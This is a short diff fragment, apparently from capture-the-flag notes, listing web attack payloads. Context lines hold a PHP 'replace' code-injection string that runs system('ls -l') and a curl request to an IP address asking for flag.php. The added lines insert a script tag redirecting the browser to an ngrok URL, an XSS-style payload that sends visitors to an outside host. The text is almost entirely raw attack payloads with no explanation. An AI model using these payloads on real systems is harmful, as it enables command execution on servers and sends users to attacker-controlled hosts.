@@ -25,3 +25,8 @@
   /?vector=/Admin/e&replace=system(“ls -l”)
   
   curl http://34.141.115.108:30148/?start= --data 'start=flag.php'
+
+
+<script>
+window.location.href = "https://361c4f4977c5.ngrok.io/yaku";
+</script>
